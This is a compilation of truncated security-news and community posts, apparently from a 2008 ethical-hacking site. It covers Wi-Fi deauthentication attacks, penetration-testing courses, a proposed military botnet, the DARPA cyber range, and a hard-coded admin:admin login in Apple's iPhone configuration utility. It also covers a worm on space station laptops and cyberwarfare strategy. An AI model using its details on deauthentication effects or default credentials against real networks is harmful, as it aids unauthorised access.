will follow the acknowledged association response frame. this process is fairly fast (roughly an additional 20-30 ms), but added to the open system authentication and association, it can easily add up to 50 ms (total) when adding in contention time. if a single ap is used, this wont be a big problem, but a deauthentication like this may also cause a client station to roam. roaming requires passive and active scanning, which could add 1-3 seconds to the process. this additional time can easily disrupt many applications. if the wlan is using 802.1x/eap and not using opportunistic pmk caching (not widely supported in client utilities), deauthentication can cause a disruption of 0.5 - 5 seconds depending on the specific eap type in use, scanning processes, and the 4-way handshake. 802.1x/eap authentication mechanisms are almost always deployed in enterprise wlans. any application that is latency sensitive will suffer dramatic problems when the client station is deauthenticated. file transfers, voice/video streams, thin-client sessions, and other real-time applications will often break when disrupted for more than 0.5 seconds.  the 802.11w amendment to the 802.11-2007 standard offers three new security pieces: data origin authenticity, replay detection, and management frame protection. the data origin authenticity mechanism defines a means by which a station that receives a management frame (such as a deauthentication frame) can determine which station transmitted the data or management frame. this feature is required to prevent an intruder from masquerading as an authorized station. the replay detection mechanism defines a means by which a station that receives a management frame from another station can detect whether the received frame is an unauthorized retransmission. management frame protection is required to protect against forgery and eavesdropping on management frames such as action, disassociate, and deauthenticate frames through the use of security keys. most of todays wlan infrastructure systems do not support management frame protection, and until they do, deauthentication attacks will remain a significant security problem
1;SANS 560 - GPEN to be offered via SANS @Homeew quotes about this course from ed skoudis himself: im very excited that sans has scheduled my brand-new penetration testing course to be offered on-line via sans@home.  this course is called sans security 560: network penetration testing and ethical hacking, starts june 12, and you can take it from the comfort of your own browser, interacting with me, your instructor, across the internet as the course unfolds over 7 weeks. this new class is jam-packed with techniques and hands-on exercises to help prepare attendees to conduct professional penetration tests and ethical hacking exercises.  i spent over 5 months in developing the course, brainstorming with some of the best penetration testers in the business to make sure we cover the most effective techniques in use today. well discuss and perform hands-on exercises with the latest nmap functionality, including its nmap scripting engine, metasploit 3 features including the ultra-powerful meterpreter, password attacks using rainbow tables and windows pass-the-hash techniques, web app manipulation with cross-site request forgery and both stored and reflected cross-site scripting, and a lot more. this is the most hands-on course ive ever created for sans, because professional penetration testers need to know not just how the attacks work, but how to use them in a test, conducted in a safe and careful fashion with the appropriate permission.  throughout the course, youll be running exercises against our lab, accessed across the internet via vpn. for more information and pricing: http://www.sans.org/info/27089 do
1;What if I am forced to use WEP?y oldest daughter has a nintendo ds (not the ds lite or the dsi, just the ds). in order to be able to connect to the internet, the ds can only use wep encryption.  i think nintendo needs more security consultants... should i use hex or ascii when creating a key? when entering a key, you have the choice of entering hexadecimal or ascii characters. hexadecimal (hex) is the easiest to use. you can either create a 10-digit (64-bit) or 26-digit (128-bit) key.  we recommend the 10-digit. consider using an easy-to-remember number. http://www.nintendo.com/consumer/wfc/en_na/ds/wrwepkeyhelp.jsp#hex_ascii so since wpa (supported on the dsi) and wpa2 are not possible, what can i do in order to have a "secure" connection to my wireless router? i have thought about many different things, like mac address filtering and stuff like that, but nothing that cant be hacked in less than 10 minutes... â :-\ other than only plugin my wireless router when she needs it and change the password every single time she uses it (which is quite anoying...), i cant think of anything else... any ideas
3;Air Force Colonel Wants to Build a Military Botnetol. charles w. williamson iii, the staff judge advocate, air force intelligence, surveillance and reconnaissance agency, has suggested that the air force, us dod, and even the civilian government agencies create their own botnet on which to stage ddos attacks. [quote=col. williamson]the u.s. would not, and need not, infect unwitting computers as zombies. we can build enough power over time from our own resources.  rob kaufman, of the air force information operations center, suggests mounting botnet code on the air force’s high-speed intrusion-detection systems. defensively, that allows a quick response by directly linking our counterattack to the system that detects an incoming attack. the systems also have enough processing speed and communication capacity to handle large amounts of traffic.  next, in what is truly the most inventive part of this concept, lt. chris tollinger of the air force intelligence, surveillance and reconnaissance agency envisions continually capturing the thousands of computers the air force would normally discard every year for technology refresh, removing the power-hungry and heat-inducing hard drives, replacing them with low-power flash drives, then installing them in any available space every air force base can find. even though those computers may no longer be sufficiently powerful to work for our people, individual machines need not be cutting-edge because the network as a whole can create massive power.  after that, the air force could add botnet code to all its desktop computers attached to the nonsecret internet protocol network (niprnet). once the system reaches a level of maturity, it can add other .mil computers, then .gov machines. [/quote] his entire article in the  armed forces journal  can be read  here . in response to the colonels article, kevin poulsen of  wired  magazine wrote  this article in the article, in addition to calling it "the most lunatic idea to come out of the miliary since the gay bomb," he states: brilliant! the best defensive minds in the country want to build a massive distributed computing system to do nothing  but pump crap into the internet. the article talks about carefully targeting attackers machines, but this ignores all the intermediate networks between the air force and the target, which will have to contend with a flood of garbage packets whenever some cyber dr. strangelove decides to go nuclear.  whats next? air force 4-1-9 scams? dot mil phishing attacks? the most disappointing thing about this irresponsible proposal is the tacit admission that our elite cyber warriors cant actually break into an enemys computer, instead resorting to a brute force attack designed by web defacement script kiddies eight years ago when apache servers got too hard to hack directly. im not quite sure how i feel about the whole thing, though it wouldnt surprise me if this werent a new idea and no such agency had already put one in place     i do think that kevin is over-simplifying the issue, though.  no where has col. williamson stated that the us government has no other options than to resort to "script kiddie behavior."  the fact that several other countries, particularly that one in asia...you know with the largest population in the world...have or will have similar tactics in place suggests that we pretty much need to do the same.  though obviously this is on a different level, i want to liken it to the cold war arms race.  he with the most nukes wins the war...if we both have them, no one fires them.  in this case, he with the largest botnet wins the war...or prevents it.  peace through mutual fear. what say you ehnetters? p.s. - i think we should run a 419 scam...that could supply the defense budget, thus lowering my taxe
3;[Article]-Interview: SANS Pen Test Summit Part 1 - Ed Skoudishis series of interviews means a lot to me personally. i try my best to make eh-net a welcoming place for security professionals (or aspiring ones) to talk about technology as well as their careers and life goals. this first of 3 interviews will help answer a number of questions people ask us all the time about advancing careers. this, plus my own talk at the sans pen testing summit entitled "diy career in ethical hacking" continues that quest. i hope it speaks to you as well. permanent link:  [article]-interview: sans pen test summit part 1 - ed skoudis the field of penetration testing, or ethical hacking as it is commonly described, is one of the fastest growing areas in the realm of information security. whether that is attributable to the growing number of regulations such as hipaa, sox,â glba et al or perhaps it is the fact that many hackers have grown up and now have families to support. or just maybe it is the real fear today that many organizations are garnering more press attention for recent data theft incidents as opposed to their products. no matter how you look at it, penetration testing is becoming a maturing and legitimate profession.  ed skoudis  of  intelguardians  has been an author, instructor and professional penetration tester for the better part of 15 years. the sans institute has been a highly regarded organization extolling the virtues of security education, certification and research for quite some time as well. together they have put together a summit specifically dealing with penetration testing as a profession. the  sans whatworks in penetration testing & ethical hacking summit with ed skoudis  brings together a number of authors, researchers, and actual practitioners of pen testing, the summit will not only give a view as to where we stand as a community right now but also where we are headed in the future. joining ed will be a number of celebrated hackers (the positive connotation of the term) including  google hacking expert ,  johnny long , and the man behind the  metasploit project ,  hd moore .  i once had a conversation of ed skoudis regarding career choices and advice. he indicated that he often gets asked how others can have a career like his. barring the inevitable warnings of "careful what you wish for," he graciously shared a story with me. in short, he and a number of other friends in the industry sat down for dinner to answer the same question that others now put to ed. "hey. i want to do what that guy does. how do we do it?" this special set of interviews will give you a brief glimpse into what will be explored at the summit itself as well as a look into the how these gentlemen "did it." each of these three superstars will be asked the same three questions followed by additional questions specifically focused for that individual. here we go!  let us know what you think, do
2;DARPA Wants Matrix Style Virtual World for Cybergeddonool writeup on the register: to feature human replicants, time-machine mode the us militarys famed scientific wingnut farm, darpa*, has released full details of its planned "national cyber range" - a mighty network which could be configured to simulate the cyberspace battlefields of the future. this would allow americas fighting nerds to train for the net conflicts of tomorrow, mounting attacks on simulated enemies or defending against devastating cyber strikes by the enemies of democracy. the cyber range proposal was trailed last december, but yesterday full details for those wishing to become network killing-house builders were issued (word file). essentially, darpa seem to be after something not unlike an entire simulated world. the range must "enable realistic testing of internet/global information grid (gig) scale research [and] simulate national or global communications systems". this virtual world must, of course, contain computers - of pretty much any type: the ncr must be capable of taking a physical computer and rapidly creating a functionally equivalent, logical instance of that machine that can be replicated repeatedly... given a never-before-seen physical computing device, [the range must] create logical instantiations of the physical native machine that accurately replicates, not only the software on the machine, but hardware to the interrupt level, chipset, and peripheral cards and devices... and thats not all. the cyber range must also be populated with simulated human beings to play the parts of users, sysadmins and so forth. darpa refers to these software sim-people as "replicants". replicants must be capable of implementing multiple user roles... replicant behavior will change as the network environment changes, as the replicated “outside environment” (i.e. defcon, infocon, execution of war plans, etc) changes, and as network activity changes (detected attacks, degradation of services, etc)... replicants will simulate physical interaction with device peripherals, such as keyboard and mice... replicants will drive all common applications... but all this is merely scene-setting. moving among the swarming virtual machines and people "injected" into darpas matrix-esque warzone will be the network combatants of the usa and its enemies - the opfor, or opposing forces. the cyber range agents of opfor arent going to be script kiddies in their underpants operating from bedrooms in their parents house. theyre going to be more like operation screaming fist**, or perhaps agent smith. realistic, sophisticated, nation-state quality offensive and defensive opposition forces... capabilities include sophisticated cyber activity, from defending national assets, to computer network attack... cyber adversaries [equipped with] a malware library of offensive tools for use by darpa-authorized individuals on the range [and] a defensive tools library... battling these fearsome enemies amid the hapless simulant hordes will be the cream of americas elite combat geeks, armed with network weapons of fearful potency - or "potentially revolutionary cyber research and development technologies", as darpa puts it. the pentagons network gladiators add that "the range must be capable of testing a variety of technology thrusts [and] classified cyber programs". unsurprisingly, with crack pentagon dorks tooled up with secret cyber thrust packages battling "nation-state quality" opposition packing weapons-grade malware, darpa expect a lot of virtual devastation and e-blood all over the carpet. even so, the range must be able to clean itself up and rebuild instantly - or "sanitize resources securely and rapidly when resources are freed from tests". its also important that none of the devastating cyberplagues and self-replicating code pestilences unleashed in the range get out of control. the builders must "ensure data does not spill across tests and testbeds while on the range or archived... [and] ensure a test does not perform an unintended denial of service on other tests". and just in case all that wasnt enough, the range must also be able to function as a time machine. time dilation/contraction... [contractors must] develop technologies to accelerate or decelerate test time (relative to reality); to enable new capabilities (for example, to create bandwidths that are not commercially available today)... the whole business plainly raises quite a few questions, not least the obvious one: will the replicants know they are only software running in a giant battle simulation? and how can we be sure we arent in the range already? ® *defence advanced research projects agency **from the seminal work neuromancer. as if you didnt know. original story: http://www.theregister.co.uk/2008/05/07 ... range_rfp/ do
1;PeerGuardian2o ive been fighting spam at work for a little while now trying to get ahead and, until recently, i hadnt had much luck. it seemed like a losing battle. im sure most of you hear the same thing from your end-users... "i received a ton of spam mails today!" come to find out, they received a whopping 4 in their inbox when they got in this morning. it apparently kills them to click the delete button this many times, so they feel the need to complain to it. on our end, we typically just ignore it, and point them to their junk box which typically contains thousands of junk emails for the past 30 days that  didnt  get to their inbox. yet still, they just dont seem to comprehend how much spam is actually blocked. i know at our company, for the past few months our spam filter has recorded blocking upwards of 5 million spam emails per month. were not that big of a company, so i cant imagine what others must see. we had added all of the possible updates to our spam filter, turned up the aggressiveness, and still we were receiving complaints. i attempted to try and block the top spammers at our firewall, but this was a pretty crappy task and made me want to pull my hair out each day sitting and recording all the new ips. finally i thought i had a great idea... since we dont do business in country x, why dont i just add all the network ranges for that country into the firewall instead. this worked out pretty well... until i found out the firewall has a limit to how many i could add. so, i thought my battle against spam was over... spam 1, bill 0. enter  peerguardian2 by phoenix labs a co-worker stumbled upon this little utility called peerguardian and said that it could block both inbound and outbound traffic by simply giving it a list of ip addresses or ranges. awesome! with a little help of  countryipblocks.net , i had a pretty good list of ip ranges for every country. i installed this utility, gave it my list, and it immediately went to work blocking ip addresses from china, russia, spain, etc. the only problem at this point was that it stopped running as soon as i logged out. not a problem. a quick search and there are some perfect  instructions for installing as a service . our spam filter intake has decreased from an average of 10-15k spam emails/hour, to under 1k an hour, and still decreasing. i continue to find new ips not listed on countryipblocks.net, but as soon as i do, i toss it into my list and easily block the whole range. anyway, its a great little tool (though no direct relation to hacking) and im just excited that ive finally got a better handle on the inbound spam. sorry for such a long post  billv edit: forgot to note that this is a free, open-source utility and supported on windows 98, me, 2000, xp, and 2003, in 32-bit and 64-bit

2;iPhone creates mobile malware tipping pointver on his  blog , amrit williams discusses one of my steadily growing concerns regarding enterprise security. with the advance in technology, as well as the dropping prices for it, more and more users will be introducing their own devices to the network.  the iphone is but one example of the myriad handheld devices, pdas and the like, that are destined to create a security  headache  migraine. as amrit says, some of announcements from the apple conference affecting security include: • enterprise support (including microsoft exchange integration and office applications) the point at which mobile and handheld devices become real issues for enterprise it is the point at which data can be viewed and manipulated in the same way it can be on a desktop or laptop. the ability to store, forward, read, and write microsoft office applications eliminates the need to use a conventional computer to do real work, but creates a nightmare scenario for organizations who are still challenged by securing data on the devices for which they are responsible. • 3g support fast internet access will only increase the use of the iphone for web browsing, on-line banking, commerce, and enterprise saas applications like salesforce.com. handheld salesforce.com access, for example, will be a boon to field sales people, but opens the door to increasing the number of browser-based attacks. • gps support although this may seem innocuous from a security perspective, it is clear that targeted malware is on the rise. imagine being able to tailor a message to not only include information about the recipient but to include or reference their location. • iphone development environment in my opinion the most significant wwdc announcement has been the introduction of the iphone as a development platform that shares apis and tools with mac osx. couple this ability to cross-pollinate malware between the iphone and mac osx, with a rich media layer and an easy-to-use development environment, and you create endless fun for the legions of malware authors looking to profit from the proliferation of iphone and mac os x. according to amrit, and i would assume most others, three very difficult things for it departments to attain are necessary sooner rather than later. [quote=amrit]1. attain visibility real-time visibility into assets, software and activities inside an infrastructure is the primary prerequisite for resolving the mobile assets problem. after all, how can you manage what you don’t see? visibility must extend to mobile assets’ configurations and their actions on the network. it’s not enough to know that bob in accounting owns an iphone. you also need to know what software the iphone runs, whether it is really bob who is currently accessing confidential data, if he has rights to see this data, and whether he is doing it in a safe way. 2. set usage policy as it managers lose influence over the kinds of devices that play on their networks, the question becomes less about managing tangible assets and more about protecting information and controlling processes. this argues for a platform-agnostic policy-driven approach to information security management that encompasses both conditions and actions. 3. enforce policies and controls policies without means to enforce them have all lasting effect of new year’s resolutions. to be effective in a world of mobile devices that come and go from the enterprise network, enforcement cannot be a matter or centralized command and control, but rules embedded in, and enforced, by the devices themselves.

2;Last Lecture Professor Passes Awayandy pausch, a computer science professor at carnegie mellon university and recent youtube star, succumbed to the cancer that was the driving force behind his last lecture. it was also turned into a number-one best-selling book. what a great last hurrah and an inspiration to all of techies. see the entire lecture here: http://www.youtube.com/v/ji5_mqicxso&hl=en&fs=1 randy pausch, the professor whose "last lecture" became a runaway phenomenon on the internet and was turned into a best-selling book, died friday of pancreatic cancer, carnegie mellon university announced on its web site. pausch, 47, a computer science professor, delivered the lecture, "really achieving your childhood dreams," at carnegie mellon in september 2007, a month after being told he had three to six months to live because his cancer had returned. the lanky, energetic pausch talked about goals he had accomplished, like experiencing zero gravity and creating disney attractions, and those he had not, including becoming a professional football player. he used rejections he was handed when he applied for jobs at disney to comment on the importance of persistence. "the brick walls are there for a reason ... to show us how badly we want something," he said. "because the brick walls are there to stop the people who dont want it badly enough. theyre there to stop the other people."  starting with a joke about "a deathbed conversion" -- "i just bought a macintosh" computer -- the educator went on to say that one of his childhood dreams was to write an entry in the world book encyclopedia.  "i guess you can tell the nerds early," he added. an expert in virtual reality, pausch did go on to write an encyclopedia entry on the subject. he discussed his fondness for winning stuffed animals at fairs, showed a slide of them, then -- pretending to be concerned his audience would think the image had been digitally manipulated -- produced them onstage. donning silly costume items like a vest with arrows sticking out of it and a mad hatters hat, he described working with students as a way to help other people achieve their dreams. he also played down his own importance, saying that after he got a ph.d., his mother took to introducing him as "a doctor, but not the kind who helps people." the lecture has been viewed more than 3.2 million times since it was posted on youtube in december.  pausch co-founded the universitys entertainment technology center and was known for developing interdisciplinary courses and research projects that attracted new students to the field of computer science. he also spent his career encouraging computer scientists to collaborate with artists, dramatists and designers, carnegie mellon said. the universitys president, jared cohon, described pausch as "a brilliant researcher and gifted teacher." "his love of teaching, his sense of fun and his brilliance came together in the alice project, which teaches students computer programming while enabling them to do something fun -- making animated movies and games," cohon added. "carnegie mellon -- and the world -- are better places for having had randy pausch in them." pausch describes cohon urging him to talk about having fun in his lecture, and telling him its difficult because its like asking a fish to talk about water. "i dont know how not to have fun," he said. "im dying and im having fun. and im going to keep having fun every day i have left." pausch is survived by his wife, jai, and three children.  original story: http://www.cnn.com/2008/showbiz/books/0 ... index.html do

1;So you want to learn hacking?made a post earlier about my concerns about people assuming hacking is limited mostly to exploiting software.  the founder of the metasploit project himself made it clear at the last blackhat conference that “hacking is not about exploits. as many professional auditors know, only one or two real exploits may be used during a penetration test.”  he mentioned that most of the time you are cracking passwords, exploiting trust relationships, etc… at that same conference, the opening speaker, richard clarke (former chief counter-terrorism adviser to the us national security council) seemed to think completely opposite of that perception. he seemed to feel if we could get coders to write more secure software all would be right in the world.  what concerns me is if someone new to security simply downloads a copy of backtrack and runs autopwn on their network and doesn’t get a shell, now feels his network must be secure.  this couldn’t be further from the truth.  there is a site i have started to recommend to those new to security. most of us know about it, but i am not sure how many have actually gone there and downloaded the live cds and hacked them. i am referring to the de-ice.net live pentest cds.  this is such a great concept and i really support it for training those new to the field. now i have only downloaded the first 2 and i will say any seasoned hacker can get through them quickly, but what i like is you can’t exploit them to get root with metasploit. you have to think like a hacker. my understanding is the scenarios were created from “real life” pentests the author of these cds tom wilhelm encountered in the field.  the entire concept of live pentest cds has so much merit.  you can easily boot them up and hack away. if you screw things up, just reboot.  the very best thing about this project is there is a challenge involved. that has always been the weak part of a home lab. now i am a big supporter of having a lab and have made a number of posts here about doing that. but the one weak aspect is you already know if it’s vulnerable or not when you set it up. well, unless you are into exploit research, but most cehs are not doing that and  are simply practicing with their tools.  being great with tools is fine, but it doesn’t teach you how solve puzzles and that’s what hacking is all about. a live pentest cd on the other hand presents a puzzle for you try and figure out.  it teaches you how to “think” like a hacker and how to solve puzzles. this is in my opinion the most crucial quality to gain and i really don’t care how well you know all the switches of nmap or you know metasploit top to bottom, etc… yes, like anything there are some short coming and live cds are not perfect. they don’t give the feel of a networked environment. however you could rewrite them to be if you wished, but thats not really what they are all about any way.  there are not many available so far and of course they are all presented in linux so you wont be hacking server 2003, but once you have the concepts down you could easily apply the concepts to any os.   if you do decide to take a stab at the cds , please resist the temptation to looks at the spoilers out there.  there are even full video spoilers available, but this would make as much sense as going to an answer page of a crossword puzzle before you even try and filling in all the blanks!   i doubt that will make you a better crossword player. just to say again, the value is not that you are going to learn some new amazing hacking technique, but that you can learn to solve puzzles and think like a hacker.   from what i gather, this is the same attribute that muts is trying to instill in his course and if you are going after that certification, before you take the test it might benefit you to run through these cds. i really can only say good things about the concept and i hope one day it will be expanded to include every level of challenge.  http://de-ice.net/index.php?name=news&f ... icle&sid=
2;Wall of Sheep: Coming to your company?alk about user awareness training.â   defcon displays a long list of details showing who at the hacker conference has sent readable data using insecure wireless connections the wall of sheep has become a fixture of the defcon hacker conference: a wall with a long list of details showing who at the conference has sent readable data using insecure wireless connections.  for brian markus, better known to conference attendees as "riverside," it just may become a line of business. last month, markus and three of his fellow volunteers incorporated a company called aries security, which they bill as an education and security awareness consultancy that can come in and identify risky behavior on corporate networks.  the company is still in an experimental state, meaning that none of the partners have actually quit their day jobs, markus said.  they dont expect companies to start projecting their own wall of sheep displays in their lobbies, but they say the network analysis tools theyve developed could be helpful when aimed at corporate networks. "we can go into a company if they need help with a security awareness program," markus said. "there are an amazing amount of things that we could see by watching the traffic go by."  wall of sheep  got its start in 2002, when markus and friends were sniffing wireless lan traffic at defcon. it turned out there were plenty of people putting their data out on those networks. "we were saying there are so many of them, they are everywhere." inspired by a t-shirt, they decided to call the people they could observe "sheep," and they started sticking paper plates on the wall with some of the user details theyd found. they list login names, domain or internet protocol addresses and partial passwords.  hotel management wasnt crazy about the idea of paper plates being stuck to the walls, so the wall of sheep was soon using a projector.  theyve seen some pretty crazy stuff revealed on open wireless lans over the years, including fake usernames and passwords, brand-new computer attacks, a tax return and what markus calls "nontypical adult material."  today the project attracts dozens of volunteers at the conference who spend hours hunched over computers analyzing data before its put up on the wall. "its a tremendous amount of human labor," markus said.  wall of sheep made its first appearance ever at defcons less chaotic sister conference black hat this year, and it got a lot of attention when french journalists tried to post sensitive information on the wall that was culled from a black hat network set up for reporters.  because the journalists had illegally sniffed the black hat network without permission, markus refused, and eventually the journalists were ejected from the conference. "we said, no way," he said. "its completely against what all of us are trying to do."  original story: http://www.infoworld.com/article/08/08/ ... any_1.html do
2;VMware Issues Patch For Hypervisor Bughis is not a security issue, but, since many use vmware products, i thought it would be of interest. ceo paul maritz apologized to customers and said vmware was determined to get to the bottom of the problem that caused virtual machines to refuse to start. by charles babcock  informationweek  august 13, 2008 04:00 pm  vmware has issued a patch for the bug that was contained in update 2 for the esx 3.5 hypervisor, a bug that caused esx and esxi 3.5 virtual machines to refuse to start up tuesday morning. the company also is working to fix the update 2 software and reissue it without the flaw.  the esx 3.5 hypervisors update 2 was first released 17 days ago. the new, freely downloadable esxi 3.5 hypervisor was released 16 days ago. the company said it expect the bug-free software to become available at later today. a license limitation built into the update 2 release caused esx and esxi 3.5 virtual machines to stop running tuesday morning. vmware issued a patch for existing update 2 users at about 9 p.m. tuesday. it didnt have an estimate of how many customers were using update 2 or what percentage of the customer base had adopted it. because the update was issued only recently, it is possible only a fraction of the customer base has tested the update in isolation and then implemented it in production.  nevertheless, new president and ceo paul maritz wrote a letter in which he apologized to customers and said vmware was determined to get to the bottom of the problem. "i want to apologize for the disruption and difficulty this issue may have caused our customers and our partners. your confidence in vmware is extremely important to us, and we are committed to restoring that confidence fully and quickly."  vmware hoped to have a new version of update 2 available by noon on wednesday, it said tuesday as news of the bug spread. vmware spokesmen at noon revised that timing and said the new version will be ready by 6 p.m. on wednesday.  "we are doing everything in our power to make sure this doesnt happen again," maritz letter, posted on the vmware web site, said. "vmware prides itself on the quality and reliability of our products, and this incident has prompted a thorough self-examination of how we create and deliver products. ... we have kicked off a comprehensive, in-depth review ... and will quickly make the needed changes."  the problem was created when esx 3.5 update 2 was sent to customers with a piece of code in it that caused the license governing use of the code to expire at 12 a.m. on tuesday, aug. 12. that wouldnt shut down a continuously running virtual machine, but it if had been decommissioned and stored monday night, it wouldnt start again tuesday morning. likewise, use of the vmotion capability that shuts a virtual machine down on one physical server while starting a carbon copy on another server would also cause the virtual machine to fail.  a virtual machine that was left in suspension mode monday night could not be brought out suspension on tuesday morning, vmware officials said.  maritz explained that the inadvertent code in update 2 "was designed to ensure that customers are running on the supported, general available version of update 2," not earlier, unsupported versions of update 2. but the explanation was still likely to leave users of the free version of the esx hypervisor, esxi, disgruntled if they had been sold on its ease of use features. original story: http://www.informationweek.com/news/sec ... =210003652 do
2;Apple Hard Codes Admin UN & PW in Enterprise iPhone Apphis is from a posting on informationweeks security weblog by jordan wiens. i dont know if they fixed this issue in the latest update of the software released on july 10, but all i can say is, "wow!!" jordan is correct when he writes, "what a mess!" can you imagine if something like this is found in a consumer iphone app and not one at the enterprise level? apple and security: long road still ahead apples trying to pick up its game with iphone security, recently listing an iphone security engineer position. assuming the job is really about helping users -- and not just thwarting pesky unlockers -- its a good move, but some corporate inertia might need to be overcome before security is a true priority. just take a look at the official iphone enterprise deployment tools. apples enterprise iphone support site contains links to three tools to create custom configuration files that can be used to provision large numbers of iphones in an enterprise environment. the only documentation is a pdf deployment guide hidden in plain sight in the middle of the main graphic on that page. unfortunately, taking a quick peek at the web utility 1.0 for mac reveals not only huge usability flaws, but some potential security problems, too. the installer is lacking any documentation, and gives no feedback as to what its doing. poking into the deployment guide reveals that it isnt just a tool for deploying configuration rules via a web server, it actually is an entire web server installed onto the machine used to create the configurations. poking through the source reveals an embedded ruby on rails application, and heres where it begins to get really sketchy. the server installs itself on port 3000, is remotely accessible by default, and uses a default username and password (admin:admin) that can only be changed by finding the source files yourself and hand-editing the hard-coded credentials. youll find the settings in the "authentication.rb" file, which addtitionally contains this particularly amusing comment: # this file contains the (plain-text) user name and passwords for individuals # authorized to access the iphone configuration web utility # # this should be used for testing purposes only. # whoops! fortunately, apple has been doing some good security work lately in securing the version of ruby on its systems (apple often runs outdated versions of software with known vulnerabilities and is usually many weeks or months late in distributing patches to those included applications) through the efforts of drew yao. at least its not installing a version of ruby that is vulnerable out of the box. of course, that assumes the application itself was written securely, but given the nature of how the entire service is installed and configured, it seems like that might be too much to ask for. if you decide that the security risk is a bit much for you, or even if youre simply done creating your configuration files, good luck disabling the web server your mac is now running. there is no uninstallation method documented anywhere on apples site for actually removing the service! so any future vulnerability in ruby unnecessarily exposes your machine, even if it no longer needs the running service. ironically, its actually easier to use a gui in windows to disable the windows version of the same service (through the administrative services control panel) than the recommended commandline in os x. one unofficial method to remove the service once installed was posted as a comment over at tuaw: [http://www.tuaw.com/2008/07/10/apple-releases-iphone-configuration-web-utility-1-0/] : sudo launchctl unload /system/library/launchdaemons/com.apple.iphoneconfigservice.plist sudo rm /system/library/launchdaemons/com.apple.iphoneconfigservice.plist of course, that still leaves the plethora of files installed by the package in the first place that will require manual removal. what a mess! it would be nice to think that this is more indicative of a rushed iphone 2.0 deployment than apples general attitude toward security. sadly, that doesnt seem to be the case, as demonstrated by apples handling (or lack thereof) of the recent dns cache poisoning attack. hat-tip to ryan naraine over at the zero day blog for catching apples security engineer job posting. original story: http://www.informationweek.com/blog/mai ... secur.html do
3;Man Looks Into the Abyss...cant sleep as today is the day that marks the end of one 6.5 year chapter and the beginning of the fulfillment of a life-long dream. the past 2 months plus have been hectic with the transition away from my day job with finalizing projects, training my replacement and all the other things one does when leaving a job gruntled. dont get me wrong, i have my complaints just as everyone does about their job, but ive always tried to do the right thing. my karma is better for it.   it has put me behind on this site and other projects, but i feel like it is a situation of one step back to take two steps forward. i have so many ideas and plans for this site, i cant wait for today to end, so i can get to it. ok… i’ll actually start on monday, but you know what i mean. youve probably seem some of the ideas starting to come already, as i couldnt help myself. ive rearranged some of the forum boards and even added a new columnist board. did you catch that one yet? yes we not only have old columnists coming back with new articles, but also a new regular columnist on the way. we also have many friends of eh-net who will be popping in as guest writers to add more content. too many ideas to mention here, but the basic principles are: 1. content is king 2. eh-net will remain free and freely available i’m already running behind on articles submitted to me for editing/posting. my apologies to our readers and the writers waiting on me, but heres a hint on some soon-to-be-released “stuff”... reviews of splunk, spiceworks v3, ironkey, proof of concept article and vid from dan hoffman, the return of craig heffner and justin peltier, and continuing great stuff from chris and brian. as for the skillz hacking challenges, ed promises the answers to it happened one friday. he is not only incredibly in demand, but this challenge is very personal to him as you’ll see in his answers. so we’ll be patient. his fu is always worth the wait. i hope i’m not jumping the gun, but we’ll have at least 2 more challenges this year. scooby doo is on deck as well as ed’s annual christmas challenge. all great stuff to push us through 2008 and into an awesome 2009! so here i am standing on the edge looking into the abyss. im scared sh!tless yet more excited than at any other point in my professional career. of course there really is no abyss, but then it wouldnt be as dramatic. its not even that much of a risk, because it is a highly calculated risk. with the unbelievable support of my wife, i have the opportunity to avoid that conversation many have 30 years from now wondering what if. for that i will be eternally grateful. and if we fail, then so be it. i’ll be sending all of you my resume. there are worse problems in the world. what started as a small idea and side project has now ballooned into the catalyst for making a dream come true. i plan on bringing all of you along for the ride. i hope you’re with me. and for more borrowed quotes (how about a little impromptu contest... from where are the following quotes): to my colleagues i leave behind, "so long and thanks for all the fish." to all of you, "onwards and upwards." to my wife, "you complete me." and away we go, don ps - title quote from hal holbrooks character, lou mannheim, in the movie wall street.

2;Worm Hits Unsecured Space Station Laptopsasa has confirmed that laptops taken on to the international space station (iss) last month carried the w32.gammima.ag virus, which steals the login details for online games popular in the far east, such as "maple story" and "talesweaver."  w32.gammima.ag – first detected a year ago – sends the personal data it collects back to a central server. the bug, considered low-risk by anti-virus firm symantec, is not thought to be a threat to the control and command system, or to any iss operations. nasa spokeman kelly humphries said in a statement that this was not the first time that the iss had been affected by malware, merely calling it a “nuisance.”  the laptops did not have any anti-virus protection or detection systems loaded, she said. they were being used to run nutrition experiment programs and gave astronauts email access. nasa believes that the virus was either loaded with software or transferred via a personal compact flash card.  nasa is investigating the problem with its russian counterparts to see where it stemmed from and to learn what measures can be taken to prevent a repeat of the situation. original story: http://www.scmagazineus.com/worm-hits-u ... le/115939/ do
3;Cyberspace and the Changing Nature of Warfarereat article in sc magazine by kenneth geers: strategists must be aware that part of every political and military conflict will take place on the internet, says kenneth geers. practically everything that happens in the real world is mirrored in cyberspace. for national security planners, this includes propaganda, espionage, reconnaissance, targeting, and – to a limited extent – warfare itself. strategists must be aware that part of every political and military conflict will take place on the internet, whose ubiquitous and unpredictable characteristics mean that the battles fought there can be just as important, if not more so, than events taking place on the ground. aggressive cyberwarfare strategies and tactics offer many advantages to their prospective employers, and current events demonstrate that cyber conflict is already commonplace around the world. as a consequence, national security leadership must dramatically improve its understanding of the technology, law, and ethics of cyber attack and defense, so that it can competently factor cyberwarfare into all stages of national security planning. cyberwarfare: strategy the internets imperfect design allows hackers to surreptitiously read, delete, and/or modify information stored on or traveling between computers. there are about 100 additions to the common vulnerabilities and exposures (cve) database each month.1 attackers, armed with constantly evolving malicious code, likely have more paths into your network and the secrets it contains than your system administrators can protect. the objectives of cyberwarfare practitioners speak for themselves: the theft of research and development data, eavesdropping on sensitive communications, and the delivery of powerful propaganda deep behind enemy lines (to name a few). the elegance of computer hacking lies in the fact that it may be attempted for a fraction of the cost – and risk – of any other information collection or manipulation strategy. cyberdefense is still an immature discipline. traditional law enforcement skills are inadequate, and it is difficult to retain personnel with highly marketable technical skills. challenging computer investigations are further complicated by the international nature of the internet. finally, in the case of state-sponsored computer network operations, law enforcement cooperation will be either potemkin or nonexistent. the maze-like architecture of the internet offers cyber attackers a high degree of anonymity. smart hackers can route attacks through countries with which the victims government has poor diplomatic relations and no law enforcement cooperation. even successful investigations often lead only to another hacked computer. governments today face the prospect of losing a cyber conflict without ever knowing the identity of their adversary. nation-states endeavor to retain as much control as they can over international conflict. however, globalization and the internet have considerably strengthened the ability of anyone to follow current events, as well as the power to shape them. transnational subcultures now spontaneously coalesce online, and influence myriad political agendas, without reporting to any chainofcommand. a challenge for national security leadership is whether such activity could spin delicate diplomacy out of control. cyberwarfare: tactics increasingly, governments around the world complain publicly of cyber espionage.2 on a daily basis, anonymous computer hackers secretly and illegally copy vast 